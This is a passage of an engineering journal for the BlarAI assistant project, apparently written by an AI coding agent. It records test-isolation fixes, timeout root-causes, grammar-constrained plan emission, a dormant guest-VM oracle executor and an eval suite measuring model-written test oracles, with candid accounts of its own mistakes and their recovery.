+The reconciliation that had to be exact: F3 landed on main WHILE I was building, pinning per-task oracles to the `app` package. My arms create `app/tokenize.py`, `app/word_frequencies.py`, `app/neighbor_pairs.py`, `app/report.py`; the F2 job oracle imports `from app.tokenize import tokenize` and the three siblings; F3's convention is "extend the `app` package, add an `app/<name>.py` submodule" — the same namespace. The oracle isn't mocked-green: a subprocess test runs the REAL shipped oracle under the driver's exact `python -m pytest` mechanism against a reference `app` package and proves it passes on a correct build, fails when the report drops the bigram findings, and fails when a count arm is wrong. That the grade command is `python -m pytest` (not bare `pytest`) is load-bearing — it's what puts the repo root on `sys.path` so `from app.tokenize` resolves at all.
+
+**Next:** the reviewer rebases this onto current main (F3 present; non-overlapping in `acceptance.py`), runs the full gate, and reconciles the `app.*` names at merge. The live proof is the next overnight battery run: B2 should dispatch as a ≥2-task plan with ≥4 edges / ≥3 waves and score on its job oracle, not STALL on the flat degrade.
+
+*(Lesson 141 tally.)*
+
+### 2026-07-06 — The redirect that didn't reach the certs
+
+*Plain summary: #751 — the standing gate's launcher tests minted per-boot mTLS certs into the REAL `<repo_root>/certs/` (via `main()` Step 1.5), orphaning a live AO's in-memory CA; fixed by redirecting the mint to a tmp dir in the existing `launcher/tests/conftest.py` autouse fixture, plus two regression locks. Recurrence of lesson 55.*
+
+The alarm was a `CERTIFICATE_VERIFY_FAILED` earlier tonight: a running Assistant Orchestrator suddenly could not complete its mTLS handshake, because something had rotated the per-boot Certificate Authority out from under it. The something was the test suite. `launcher/__main__.py::main()`, in production posture (the HOST default, `dev_mode=False`), reaches Step 1.5 and calls the real `provision_per_boot_certs(repo_root=<repo_root>)`, which mints nine fresh PEMs into `<repo_root>/certs/` — the exact directory the shipped Policy Agent config reads (`certs/pa_server.pem`, `certs/ca.pem`). `launcher/tests/test_launcher.py::test_production_happy_path` drives that real `main()` with every dependency mocked *except* the cert mint. So running the standing gate from the operator's live checkout re-minted the live certs mid-session; the AO, holding the previous boot's CA in memory, no longer matched disk.
+
+What makes this a clean lesson-55 recurrence — and not merely a repeat — is *why the existing control missed it*. Lesson 55's durable fix was a root `conftest.py` that redirects `LOCALAPPDATA`/`HOME`/`XDG_DATA_HOME` at module-load, before any import resolves a user-data path. That control is real and it works — but it guards `%LOCALAPPDATA%\BlarAI\`. The per-boot certs live in `<repo_root>/certs/`, *inside the repo*, governed by no environment variable at all. The redirect never reached them. The isolation discipline had a blind spot exactly the width of "state that is real, writable, and not under `LOCALAPPDATA`."
+
+The fix had a design fork worth naming. Lesson 55 itself warns "set the isolation before import, not in a fixture" — because an import-time constant like `SESSION_DB_PATH` has already resolved by the time any fixture runs. So my first instinct was to reach for the same before-import mechanism. But it doesn't fit here: the cert-write target is not an import-time constant — it is computed at *call* time, inside `main()`, as `Path(__file__).resolve().parent.parent / "certs"`, and no env var selects it. There is nothing to redirect at import. The correct tool is the one lesson 55 cautioned against *in its original context*: a fixture — specifically the autouse `launcher/tests/conftest.py` fixture that already neutralises the instance-lock (lesson 209) and the privilege strip for every launcher test. I extended it to also patch `launcher.__main__.provision_per_boot_certs` to a wrapper that still runs the *real* minting (full boot+cert coverage preserved) but forces `certs_dir` to a throwaway tmp path, ignoring the production `repo_root` the launcher passes. The judgment: "isolate anything that can reach real, writable state" is the invariant; "do it before import" was a mechanism bound to the import-time-constant case, not a universal rule. Match the mechanism to how the target resolves.
+
+I confirmed the defect empirically before touching anything — deleted the worktree `certs/`, ran `test_production_happy_path` alone, watched nine PEMs appear with a fresh mtime — and confirmed the fix the same way: after the change, the full launcher + boot + cert suite (406 passed) leaves both the worktree and the operator's live `certs/` byte-for-byte untouched. The two regression locks carry a deliberate belt-and-suspenders shape: each opens with a fail-fast pre-assert that `launcher.__main__.provision_per_boot_certs` is no longer the real function, so if the redirect ever regresses the lock fails *before* driving `main()` — it detects the regression without itself committing the pollution it guards against. I proved that has teeth by removing the redirect and watching both locks fail at the pre-assert while the certs dir stayed clean.
+
+One scope note for the reader: the model-loaded tier `test_production_boot_integration.py::TestProductionBootCascadeRealModel` mints into the real `<repo_root>/certs/` *by design* (the real PA reads the shipped cert paths), but it is `@pytest.mark.hardware` — deselected from the standing gate and TPM-skipped — so it is not a gate polluter and is intentionally left alone. D1 (the battery's mTLS re-ensure) already self-heals this drift at runtime; #751 stops the gate producing it at the source.
+
+**Next:** the fragment's own prescription — review against current main, cherry-pick the two-file change onto a fresh main-based branch, no merge from the stale worktree — was carried out same-night (`149fd34`, merge `18aaa6d`). Forward: if the quarterly consolidation (due 2026-10-01) wants it, lesson 55's phrasing grows the clause that the guard surface is "any real writable state a test can reach" — repo-relative dirs like `certs/` need their own redirect because the env-var redirect cannot cover them.
+
+*(commit `149fd34` (merge `18aaa6d`) — `launcher/tests/conftest.py` autouse fixture redirects `provision_per_boot_certs` to a tmp dir; `launcher/tests/test_launcher.py` +2 regression locks (`TestPerBootCertIsolation`) + a `pathlib.Path` import; verified 406 passed / 3 deselected LOCALAPPDATA-redirected, real `certs/` mtimes unchanged, teeth-proven by redirect-removal.)*
+
+*(Lesson 55 tally.)*
+
+### 2026-07-06 — The trailer cut in the shadow of the battery
+
+*Plain summary: a second portfolio film — the coder-cut trailer (77s, `final/BlarAI_coder_demo_v1.mp4` + 720p preview) — assembled in the pre-battery window from existing dispatch footage, terminal-replay cards rendered from the day's real fleet logs, new CPU-only Kokoro narration, and the v9 score engine retargeted by segment-name anchors. No GPU touched; no new lesson.*
+
+The LA liked the v9 film and asked for a coding-abilities cut at 21:45 — with the M2 battery due to take the GPU at 23:00. That constraint shaped every choice: nothing could be generated by BlarAI itself in the window (no 14B, no image model, no app relaunch — loopback 5001 belongs to the battery's preflight), so the cut had to be assembled entirely from what already existed. Three finds made a one-hour film possible. The prior session's complete pipeline — portable ffmpeg, the assemble/score/narration scripts — was recovered intact from its scratchpad, exactly where the portfolio README said it would be. The score generator turned out to anchor its build/gap/drop geometry on segment *names*, so a new cut that reuses `s01/s02/s08/s09/s10/s99` as its act names inherits the entire composition — the EDM drop retimed itself onto the new website reveal without touching a note. And the day's own `fleet-runs` state supplied the trailer's best material verbatim, including the line the whole middle act hangs on: *"Candidate 1 did not pass the gate; trying a FRESH independent candidate (2/2)…"*.
+
+The trade-off worth recording: the film shows a **failing** gate in a promotional cut. The alternative — an all-green highlight reel — was rejected because the acceptance-gate posture (tests the coder cannot edit, best-of-N retries, honest parked verdicts) *is* the coding capability's differentiator; sanitizing it out of the marketing would contradict the very journal this project keeps. A second exclusion went the other way: the dispatch-run desktop captures were left out because they frame the operator's personal files, and were replaced with terminal-replay cards rendered from the same real logs — authentic content, controlled frame.
+
+The LA's verdict came back within the hour, and it was the right one: not impressed — the cut showed the *surface* (describe, approve, merge) and skipped the machinery that makes the coder trustworthy. He freed the GPU until 23:00 and said: use BlarAI. So v2 (114s, `BlarAI_coder_demo_v2.mp4`) added three acts on the deep systems, and the writing turned out to already exist — the modules' own docstrings are better marketing copy than anything I would have invented, so the narration quotes them nearly verbatim: the architect act is `decompose.py` ("the 14B's one intelligent job… the model PROPOSES; a DETERMINISTIC RULER DISPOSES — the model never self-certifies"), the graph act is `plan_graph.py` (dependency-ordered plans, interface contracts, `compile_waves` — prerequisites land before dependents), and the research-substrate act is `context_pack.py` (mine what dependencies *actually* built — file lists and AST-reconstructed signatures, never prose — into a ~1200-char interface card "that stops the 30B re-discovering or re-implementing its foundations"). The four new illustrations were generated by BlarAI's own `/illustrate` pathway on the Arc 140V inside the freed window (signed-manifest verify ON, ~45s per image, the process exiting cleanly so the GPU was released), which closes a nice loop: the film about the machine is now partly *made by* the machine. GPU work ended 22:06; the field was re-verified clean (battery Ready, loopback 5001 free, no resident model) 54 minutes before the battery.
+
+Three more LA notes landed inside the window and each was a truthfulness fix, which is worth noticing as a pattern: the opening said "This is BlarAI" over a frame that is only a title card (rewritten "Introducing BlarAI, and its agentic coding abilities…"); the credit line implied the narration voice was *not* BlarAI's when Kokoro IS the app's own voice engine (rewritten to credit it, and "this laptop" became "one laptop" because the film travels to people who are not looking at this laptop); and "just the website" reads as theoretical, so the final cut (130s) gained a **shelf act** — the fleet-built Node utility suite executed live on camera-honest terms (slugify/convert/password run tonight, `node --test` 28 tests 0 failures, output verbatim) and the real `~/projects` listing. The candid datum from that act's prep: not everything on the shelf is green — seaquotes runs but carries 3 red tests — and the shelf card therefore names only what was verified tonight. The marketing constraint and the governance constraint turned out to be the same constraint: say only what the frame can prove.
+
+The last note of the night was the score, and it carried the evening's best technical lesson. The LA heard "banging for soooo long" under the narrator — and he was hearing a *geometry bug, not a taste problem*: the score engine anchors its EDM snare-build on the segment named `s09`, and when the shelf act was inserted between `s09` and the drop, the build stretched across BOTH acts — ~25 seconds of escalating percussion fighting two narration lines (made worse by the build layer's gentle 0.8 duck floor). The same segment-name-anchor trick that made retiming the score free in the first place is exactly what broke: an anchor scheme pays off until an insertion changes what the name *means*. v3 re-anchors the build on the last act before the drop (~13s, v9's proportions restored), drops the build's duck floor to 0.6 so it yields to the voice, tightens three narration lines, and shortens the close — 130s → 122s. And per the LA's version-confusion note, v3 is a NEW file, not an in-place overwrite: revisions get new numbers now.
+
+v4 swapped the cold-open tease to the architect illustration (the LA heard "it builds software" over a dependency graph and rightly called the mismatch), and then the night got its most instructive failure — in the *publishing*, not the film. Pushing the coder cut to the public showcase repo, I committed from a clone that had silently failed its checkout: this tree carries filenames near the Windows 260-character path limit, the clone sat under a deep session-scratchpad path, and git left a partial index behind a green-looking clone. My three-path `git add` then committed the REST of the tree as deletions — `1786 files changed, 16 insertions(+), 593828 deletions(-)` — and I pushed a gutted public repo because I read the push line and not the stat line. Recovery was six minutes and non-destructive (fresh short-path clone with `core.longpaths=true`, restore the full tree from the parent commit, re-apply the section, push `de61e00`; remote verified file-by-file), but the lesson is permanent and now in `FIELD_NOTES.md` §Git on Windows: a fresh clone is not trusted until `$LASTEXITCODE` AND `git status --porcelain` both come back clean, and a commit's `--stat` line gets READ before any push — "1786 files changed" on a docs commit is an alarm, not a footnote. The publication itself landed: the coder cut is live on the profile README and the blarai-public README (poster → in-repo player, per the LA's chosen pattern), with the 1080p master on release `demo-film-coder-v1`.
+
+**Next:** the LA reviews v4 (`final/BlarAI_coder_demo_v4.mp4`, now also `blarai-public/media/BlarAI_coder_cut.mp4`). If tonight's battery hands B1/B2 a real GREEN, a v5 wants window-scoped moving footage of the fleet mid-run — the one visual these cuts fake with stills.
+
+*(No repo code changed; deliverables in `C:/Users/mrbla/Videos/BlarAI_portfolio/final/` (`BlarAI_coder_demo_v1.mp4`, `BlarAI_coder_demo_preview.mp4`), pipeline scripts in the session scratchpad, portfolio README updated in place; commit `<this>` carries this entry only.)*
+
+### 2026-07-07 — The budget that wore the parser's clothes
+
+*Plain summary: #757 root-caused and fixed — the m2-baseline battery's B4/B6
+"no SUMMARY line" park was the overall-run budget watchdog (5400 s) tree-killing
+the final acceptance-tests task mid-candidate, mislabeled as a parser miss.
+Fix: explicit TIMEOUT outcomes on both kill paths (per-task ceiling + budget
+abort) in `shared/fleet/swap_ops.py` / `dispatch.py`, budget raised 5400→10800 s,
+per-task ceiling 3600→14400 s. Subsystem: fleet swap/battery harness.*
+
+Night-2 handed me a clean-looking defect: two jobs (B4, B6) with every build
+task merged, every wave gate green, and the final acceptance-tests task parked
+with "no SUMMARY line for this task." The handoff brief's candidate list all
+pointed at the parser — task-name mismatch, overwrite semantics, a template
+that never emits the line. The parser has history (#686), so that was the
+obvious suspect. It was wrong, and the way it was wrong is the lesson.
+
+The wall-clock decomposition would not fit the parser story. B4 burned 5,607
+seconds; B6 burned 5,631; and the per-task run-fleet log for acceptance-tests
+was 538 bytes, ending mid-flight at "Building candidate 1 of 3 (max 60 min)."
+My first hypothesis — the per-task 3600 s timeout equals one candidate's
+60-minute budget, zero headroom — survived until the journal timestamps
+killed it too: B4's acceptance task started at 03:03:32, only nineteen minutes
+before the run died. Nothing task-scoped fires in nineteen minutes. What does
+fire is the *job*-scoped budget: `swap_run_budget_s = 5400.0`, ninety minutes,
+counted from run start — and B4's builds alone had eaten 74 of them. The
+budget watchdog tree-killed run-fleet mid-candidate, run-fleet died before
+writing its SUMMARY line, and `real_run_task`'s fallback labeled the corpse
+"no SUMMARY line for this task." The swap-progress trail even says "The
+overall run budget elapsed — restoring the 14B" one line above the verdict.
+The system knew exactly what it had done; it just didn't say so at the one
+surface a diagnostician reads first.
+
+Two defects, then. The honest-labeling one is the deeper: a kill the harness
+itself performs must never leave its victim's failure looking self-caused.
+`_run_to_logfile_tree` returned a bare `False` for both "run-fleet failed" and
+"I killed run-fleet," and the budget abort wasn't visible to the task loop at
+all. The fix threads the signal through: the tree runner now returns
+`(ok, timed_out)`, `real_run_task` emits an explicit
+`TIMEOUT / RESULT: TIMED OUT — per-task ceiling elapsed` outcome, and the
+`build_swap_ops` task wrapper consults the budget watchdog's stop event to
+rewrite the no-SUMMARY mystery into `TIMED OUT — the overall run budget
+elapsed mid-task`. A parsed SUMMARY line still wins over either label — work
+that raced the kill is real work — and a genuinely unexplained miss stays
+UNKNOWN, so the honest labels can never paper over a new defect class. The
+new vocab round-trips: `_classify_result` maps "TIMED OUT" to TIMEOUT so the
+cumulative SUMMARY.txt the gateway and harness share re-parses honestly (the
+#686 byte-shape caution, regression-locked from both sides this time).
+
+The budget itself was sized to a workload that no longer exists: 5400 s was
+"generous" against pre-plan-graph runs of ~50 minutes for 8-9 tasks. Plan-graph
+mode added the acceptance-tests task and per-wave integration gates; a 5-task
+battery job's builds alone now measure 74-79 minutes. I raised the budget to
+10800 s (3 h) and the per-task ceiling to 14400 s (4 h, dominating run-fleet's
+legitimate single-task worst case of ~3.5 h), accepting the trade-off that a
+genuinely wedged run now holds the 30B resident up to 3 h before the watchdog
+restores the 14B — against the alternative of a tighter budget that keeps
+clipping honest work, which is exactly how the campaign lost both of night-2's
+remaining passes. Run-fleet's idle-detection remains the fast kill for a stuck
+coder; the budget is an abort bound, not a wait. Verdict and attribution
+semantics are untouched — a budget-killed job is still an honest STALLED; it
+just says why now.
+
+The schedule consequence was computed before launch, not discovered after:
+with a 3 h ceiling, a pathological daytime pass (all four jobs exhausting
+budget) could still be running at 23:00, and the scheduled task's
+MultipleInstances policy is IgnoreNew — tonight's trigger would skip, losing
+pass 2. Accepted with eyes open: that world requires systemic breakage in
+which pass 2 fails identically anyway, and the realistic pass is ~5 hours.
+
+**Next:** the daytime battery pass (13:50, via the scheduled task) is the live
+proof — a banked pass, or an honest TIMEOUT label naming the next real
+constraint. A single live B4 re-run runs first as the pre-pass fix proof if
+the clock allows.
+
+*(commits `c3fbf3a` (fix + regression locks); standing gate 5586/0/0/122
+deselected on the branch; live verify = the B4 re-run + the daytime pass.)*
+
+
+### 2026-07-07 — The recovery that killed the patient
+
+*Plain summary: #758 found and fixed same-day — running the standing pytest gate
+during a live battery dispatch made the AO entrypoint's boot swap-recovery
+reconcile "recover" the healthy swap: it stopped the real OVMS mid-request and
+stamped RECOVERED over the live run. Fixes: a root-conftest reconcile guard
+(tests can never touch the real fleet root) + a driver-alive gate in
+`reconcile_swap_state` (`SwapState.driver_pid`, stamped by the driver; a live
+driver means hands-off). Subsystem: fleet swap state / test isolation.*
+
+The #757 fix wanted a live proof before the daytime pass, so I re-ran B4 on the
+GPU. Thirteen minutes in, while the coder was mid-candidate on task two, the
+battery monitor declared the job complete, the scorecard came back STALLED with
+"no driver scorecard," and OVMS was simply gone — killed between two log lines
+while it was actively serving a request. The swap state said RECOVERED. The
+driver, very much alive, kept dispatching tasks into a world with no model
+behind the socket.
+
+The diagnosis went through three wrong suspects — a double-spawned driver that
+turned out to be the Windows venv shim hosting its base interpreter (two PIDs,
+one logical process; a field note worth keeping), a phantom AO reboot, the
+re-ensurer — before the file mtimes settled it. The RECOVERED stamp landed at
+11:09:17. My own standing-gate run for the #693 change ran from 11:07 to 11:12.
+The killer was me: `service.start()` tests in the AO suite execute the
+entrypoint's boot swap-recovery reconcile, the minimal test config leaves the
+`[fleet_dispatch]` roots empty, and the empty-roots fallback resolves to this
+box's *real* fleet root. The LOCALAPPDATA redirect that protects the session
+database — the control built after Sprint 14's test-corruption incident — never
+covered the fleet's state directory. The gate had been silently capable of this
+since the reconcile shipped; it needed a live dispatch under it to fire, and
+night-2 never had one because nobody runs pytest at 3 a.m.
+
+Two defects, two fixes, both shipped today. The test-isolation half follows the
+lesson-209 shape exactly: an autouse fixture in the root conftest stubs the
+reconcile seam for every collected test (with a `real_reconcile` opt-out for
+the three tests that exercise the seam over fakes), a scoped-run belt in the AO
+package conftest covers `pytest services/assistant_orchestrator/...`
+invocations that never load the root conftest, and an identity-lock test fails
+loudly if either guard is removed — deliberately without calling the seam,
+because a broken guard plus a probing call would BE the hazard.
+
+The deeper half is the production assumption. `reconcile_swap_state` presumed
+that an AO booting while a swap is in flight means the swap crashed. That
+assumption is false whenever an AO boots *beside* a healthy detached driver —
+and the operator opening his app at 23:30 while the nightly battery runs would
+have killed the battery job exactly the way my pytest run did. The fix makes
+recovery verify the death certificate first: the driver stamps its own pid and
+process-create-time into the swap state at takeover, and the reconciler probes
+liveness (create-time matched to guard pid reuse, fail-closed to recovery so a
+genuinely crashed swap is never stranded). A live driver now gets hands-off —
+nothing disarmed, nothing stopped, nothing stamped — with an honest "still
+running" report instead of a kill. I considered gating only the test path and
+leaving production reconcile alone, and rejected it: the operator-boots-mid-
+battery case is real, imminent (the campaign runs nightly), and the fix is the
+same thirty lines either way.
+
+The B4 proof itself was collateral — cancelled cleanly (the driver honored the
+sentinel: PARKED-HONEST, OVMS stopped, 14B restored and verified-ready). The
+#757 fix remains proven only by its regression locks and the timeline math; the
+daytime pass is now its live proof, as the fallback plan always allowed. The
+gate re-ran green after the fixes with the AO live on :5001 — the exact
+scenario that fired the defect this morning.
+
+**Next:** the daytime battery pass (13:50, scheduled task) proves #757 live;
+tonight's 23:00 run attempts pass 2. The reconcile hands-off path's live proof
+is implicit in any future AO boot beside a running dispatch — no supervised
+slot needed.
+
+*(commits `72de8d4` (guards + driver-alive gate + 8 locks); standing gate
+5589/0 failed/7 env-skips (port 5001 legitimately held by the live AO)/122
+deselected; #758 filed + fixed same-day.)*
+
+
+### 2026-07-07 — Closing the free-text gaps in a sequence that was already half-grammatical
+
+*Plain summary: #743 — the four remaining structured 14B emissions in the fleet PLAN
+sequence (acceptance criteria, product assumptions, the build-signal with its
+ambiguous-platform fork, image-asset specs) now ride the same W2/#718 xgrammar
+`structured_generate_fn` hook the decompose call uses, each with a JSON schema derived
+from the same enums and caps its parser already validates against; every call keeps its
+fail-closed free-text fallback chain byte-identical. Subsystem: `shared/fleet/acceptance.py`.
+Recurrence of the built-but-unwired lesson class (the W2 decompose hook itself).*
+
+W2 grammar-constrained the decompose emission and stopped. The other four structured
+calls in the same PLAN sequence still asked the 14B for JSON politely and cleaned up
+after it with regex extraction and fail-closed coercion — which works, but every one of
+those parse-fallback paths is also a place where a malformed emission quietly degrades a
+plan (no assumptions surfaced, no build signal, no assets) and a place where model
+output gets to negotiate with a parser instead of a grammar. Extending the constraint
+was the cheapest remaining reliability win on the 14B side, and the shape of the work
+was fully dictated by precedent: reuse the injected `structured_generate_fn(prompt,
+json_schema_text)` hook, never invent a second grammar pathway, and let the live
+adapter lane stay the single wiring point.
+
+The one discovery worth keeping: the W2 hook itself was half-wired. `decompose_request`
+accepts `structured_generate_fn`, but the live PLAN entry point — `generate_plan`, the
+only thing the AO's `_handle_plan_request` calls — never passed it through. On the real
+`/dispatch` path the decompose grammar could not have fired even after the adapter
+lands; the hook existed and was reachable only from tests. That is the "built but wired
+into nothing" class again, in miniature: a green suite proved the mechanism, not that
+the running sequence invokes it. `generate_plan` now threads the hook into
+`decompose_request` alongside its own four calls, so the future adapter has exactly one
+seam to fill.
+
+Two judgment calls diverge slightly from the W2 precedent, both deliberate. First, the
+grammar leg does not get trusted just because it is constrained: its output still runs
+through the same parser, and only a *usable* emission is accepted — otherwise the
+free-text path runs in full. That costs a redundant second model call in the worst case
+and buys the invariant the ticket demanded: the grammar path off, erroring, or emitting
+junk produces byte-identical legacy behavior (the regression locks compare full
+`PlanResult` fingerprints and prompt sequences between a no-hook run and an
+always-raising hook). Second, for the two calls where an empty array is a real answer —
+assumptions ("the goal was fully specified") and asset-specs ("this product needs no
+pictures") — a constrained `[]` is accepted rather than treated as a failed parse. The
+W2 rule (non-empty parse or fall back) would have forced a free-text retry that could
+invent assumptions the constrained emission had correctly declined to make; accepting
+the empty array is the honest reading. The rejected alternative — one uniform
+"non-empty or retry" rule across all five calls — was simpler but semantically wrong
+for exactly those two.
+
+The schemas themselves are derived, not authored: tier enums from `ALL_TIERS`, surface
+and candidate enums from `SURFACE_VALUES`/`_REAL_SURFACES` (the candidates list is
+pinned to real buildable surfaces, so a grammar-constrained ambiguous fork can never
+smuggle a sentinel), style enums from `ASSET_STYLE_VALUES`, and the asset-name length
+cap hoisted to a shared `_ASSET_SLUG_MAX` so the constraint and the slug truncation
+cannot drift. The one thing the grammar deliberately does not attempt is the
+conditional coupling (an `ambiguous` surface requires >=2 candidates): that stays the
+parser's job, because a flat schema is what the xgrammar substrate is proven on and the
+ruler already disposes of the incoherent combinations. Grammar guarantees enum
+validity; the ruler still rules.
+
+**Next:** the live proof rides the next dispatch — the AO-side adapter
+(`structured_generate_fn` over `GenerationConfig.structured_output_config`, the Lane
+A2/W8 wiring) is still the missing producer for every one of these seams, and when it
+lands, one live `/dispatch` plan exercises all five grammar-constrained emissions at
+once. The oracle calls (per-task #690 and job-level W4) remain unconstrained by design:
+they emit Python/JS code, not JSON, and constraining code emission is a different class
+of problem.
+
+*(commit `3d374e0` — grammar-first emission for criteria/assumptions/build-signal/
+asset-specs + the decompose-hook threading; 18 new offline locks in
+`shared/tests/test_acceptance_grammar.py`; the model-in-the-loop proof awaits the
+first live dispatch after the W8 adapter lands.)*
+
+
+### 2026-07-07 — The certificate that must never touch the verdict
+
+*Plain summary: #744 guest-certified oracle executor built DORMANT — a new
+`[fleet_dispatch].guest_oracle_enabled=false` knob, a `SwapOps.run_guest_oracle`
+seam invoked once per job in the swap teardown's RAM-free window, a source-only
+vsock corridor mirroring the UC-003 parse channel (`shared/ipc/oracle_channel.py`),
+and the host+guest halves of the executor (`shared/fleet/guest_oracle.py`); the
+guest result is advisory evidence beside the scorecard, never a verdict input.
+Subsystem: fleet dispatch / swap driver. No new lesson class — the
+built-dormant-behind-structural-absence pattern is the #655/#719 shape reapplied.*
+
+The S4 residual in the fleet-maturation plan has always been stated honestly:
+model-written test code is arbitrary local code execution, contained by
+agent-layer controls but not OS-sandboxed. The LA-accepted closure path is not a
+sandbox — it is the NIC-less Alpine guest we already trust for hostile HTML: run
+the job-level acceptance oracle a second time where exfiltration is structurally
+impossible, and treat the result as an *isolation certificate* layered on the
+host gate. Tonight that executor exists, and the design's hardest constraint was
+not the transport — it was keeping the new evidence from becoming authority.
+The scorecard's verdict/attribution vocabulary is pinned and battery-adopted;
+one wrong field and the harness's cross-checks start grading against an artifact
+the LA never ratified. So the guest result lands in its own `guest-oracle.json`
+beside the scorecard, `advisory: true` baked into the schema, with exactly one
+opinionated behavior: a host-pass/guest-fail divergence is flagged loudly in the
+block and the progress trail, and still changes nothing.
+
+The scheduling constraint drove the wiring. The only point in a swap where
+neither model holds the box is the teardown window between UNLOAD-30B and
+RESTART-AO, so the driver invokes the new `run_guest_oracle` seam exactly there
+— guarded like `_critic_phase`, because nothing, including a raising guest
+executor, may ever delay the 14B restore. I took the per-JOB grain over
+per-candidate deliberately: best-of-N candidates are graded host-side where
+fidelity lives; shipping N snapshots across a vsock corridor per task would buy
+RAM contention and transport cost for no isolation gain (the plan §10.3
+assessment, not renegotiated here).
+
+Dormancy is double-locked, and the two locks are different kinds. The knob
+(`guest_oracle_enabled=false`) gates the driver: off means the seams are never
+touched, proven by an exact-call-list regression lock that reuses the same
+sequence the legacy happy-path test pins — dropping the gate breaks equality.
+Underneath it, the executor is transport-dormant by structural absence: no
+production code can supply a vsock transport because none exists in this build
+(`transport=None` → an honest `not-run guest-transport-unregistered`), the same
+built-not-registered shape as the #655 url-adjudicator. Flipping the TOML knob
+tomorrow would produce evidence files saying "not run," never a silent pass.
+
+Two things the build surfaced that were worth keeping. First, the offline-guest
+constraint becomes a *host-side* decision: the dependency scan (`ast` over every
+snapshot file against stdlib + pytest + the snapshot's own modules) runs before
+anything ships, so `deps-unavailable` is decided without burning the corridor —
+and a test locks that the transport is never invoked in that case. Second, a
+Windows/Linux asymmetry in `zipfile` nearly produced a false lock: the stdlib
+READER normalizes backslashes to `/` at `ZipInfo` construction on Windows
+(`os.sep` replace), so the zip-slip backslash case is unreachable through the
+stdlib on the dev box — but survives on the Alpine guest where `os.sep == '/'`.
+The member-name validator was split out (`_validate_member_name`) so the full
+hostile matrix is unit-tested OS-independently instead of silently passing
+because Windows sanitized the fixture. The rejected alternative was trusting the
+end-to-end test matrix as written; it would have shipped a green lock that never
+exercised the check it named.
+
+What deliberately did not ship: the AF_HYPERV transport wiring, the guest-side
+pytest provisioning, and any touch of the live VM — that whole limb is the LA's
+supervised go-live ceremony, mirroring the guest-parser precedent. The guest
+half of the executor (`execute_snapshot` — zip-slip/bomb-guarded extract, then
+`python -m pytest`, inheriting the host gate's `-m pytest` lesson rather than
+relearning it) is pure stdlib + pytest precisely so the ceremony ships code that
+already ran green on the host.
+
+**Next:** the supervised ceremony — provision pytest in `BlarAI-Orchestrator`,
+wire the oracle-channel transport over the proven AF_HYPERV bridge, flip
+`guest_oracle_enabled=true` for one dispatched job, and read the first real
+`guest-oracle.json`; then the LA decision on whether a divergence should ever
+gate (today it only flags), recorded on #744.
+
+*(commit `857ed43` (the dormant executor + corridor + knob + locks); new locks:
+oracle-channel wire contract, executor pipeline + certificate block, driver
+window/dormancy/fail-soft locks incl. the exact-call-list OFF proof and the
+scorecard-identical-on-vs-off proof, spec/resolver threading; standing gate
+green in the worktree; the live in-guest proof awaits the supervised slot.)*
+
+### 2026-07-07 — Measuring the judge
+
+*Plain summary: #765 offline slice — a new `oracle_quality` eval suite
+(evals/suites/oracle_quality.py + the evals/oracle_checks.py engine, 21 golden
+cases, committed baseline 20/20 offline + 1 hardware-skipped) measures the
+14B-written acceptance oracles in both failure directions: soundness (a wrong
+oracle failing correct code) against a frozen known-good B2 implementation
+harvested from today's GREEN battery run, and sensitivity (a weak oracle
+passing broken code) against deterministic append-override mutants. The
+failure-mode vocabulary (collection-error vs assertion-failure) is pinned at
+the engine grain — the same vocabulary Layer 2 later adds to live scorecards.
+Subsystem: evals harness. LA-directed same-day.*
+
+The LA asked the right governance question mid-battery: if the 14B writes the
+tests that grade every dispatch, who grades the tests? Until today, nobody —
+an oracle defect was invisible, filed under BUILD attribution alongside real
+coder failures, and the standing recommendation to keep the 14B as test
+author rested on an absence of evidence rather than evidence of absence. The
+design answer (#765) is three layers; what shipped tonight is the first: a
+golden-set eval suite in the #717 harness culture, built GPU-free while the
+daytime battery pass ran, touching no fleet surface.
+
+The fixture decision is the part worth remembering. Soundness needs a
+known-good implementation the oracle must pass, and the best one available
+was made by the system itself two hours earlier: today's B2 run went GREEN —
+all tasks merged, the job oracle passing on the integrated tree — so that
+exact tree, frozen into `evals/fixtures/oracle_quality/`, became the
+reference, and the 14B-written oracle that graded it became the pinned
+known-good oracle exemplar. The system's own verified output bootstraps the
+instrument that will judge its future output. Sensitivity then falls out of
+append-override mutations — appending a broken redefinition of
+`word_frequencies` or `tokenize` to a temp copy makes the sabotage win at
+import time regardless of the module's internals, and the oracle must go red.
+
+One expectation died on contact with reality, and the honest correction is
+better than the plan: I predicted an all-module-skip oracle would EXECUTE as
+"passed" (pytest exits 0 on skips) and wrote the golden case to pin the
+static layer as the only net for that shape. The first run failed the case —
+pytest collects ZERO tests from a module-level skip and exits 5, which the
+engine classifies as collection-error. The runner catches the trap on its
+own; the static module-skip flag is a second layer, not the only one. The
+golden case now pins the measured truth instead of my guess (the C7 family:
+believe the instrument, not the prediction).
+
+Two honesty postures were designed in rather than bolted on. Offline cases
+measure the CHECK ENGINE and pin recorded exemplars — the suite's docstring
+says plainly they do not measure the live model; only the `model`-mode case
+does, and until its real-generator wiring lands at the first live 14B slot, a
+hardware run without an injected generator reports ERROR naming the missing
+step — never a faked measurement. And the known-limitation case (assertions
+hidden in helpers read as low-assertions) is pinned as a golden case rather
+than left as a surprise.
+
+**Next:** the model-mode generator wiring at the first live 14B slot (a
+freshly generated B2 job oracle graded by the same machinery — the first
+real oracle-quality datum); Layer 2 (the `oracle_failure_mode` scorecard
+evidence field) lands post-campaign with the #763/#764-era boundary; then
+the #688 "should a different model author the oracles" question gets its
+first data.
+
+*(commit `0ae27f1` — engine + suite + 21 golden cases + baseline + fixtures +
+12 gate locks; eval gate now 5-suite; standing gate green on the merged
+tree.)*
+
+
+### 2026-07-07 — The timeout behind the timeout
+
+*Plain summary: the daytime battery arc — three launch attempts, the #757
+budget fix live-proven on B4, and a SECOND distinct timeout class (#766)
+found, root-caused and fixed the same evening: the gateway's per-prompt 180 s
+receive budget also governed the dispatch PLAN frame, and a PLAN against a
+cold just-swapped-back AO legitimately outruns it. Fix: a PLAN-specific
+480 s budget threaded per-call through the transport openers, defaults
+untouched. Plus the #761 visible-console diagnosis (the venv shim defeats
+DETACHED_PROCESS one hop down) — deferred, not rushed. Subsystem: ui_gateway
+transport / battery campaign.*
+
+The morning's fix had a clean thesis: the overall-run budget was killing the
+battery's final task, so raise the budget and label the kills honestly. The
+daytime pass was meant to prove it, and it did — B4 ran its full 69 minutes
+through every wave and the job-acceptance phase inside the new budget and
+ended PARKED-HONEST with a complete ledger: two features merged behind green
+gates, one parked on a no-op build, dependents skipped honestly, and the job
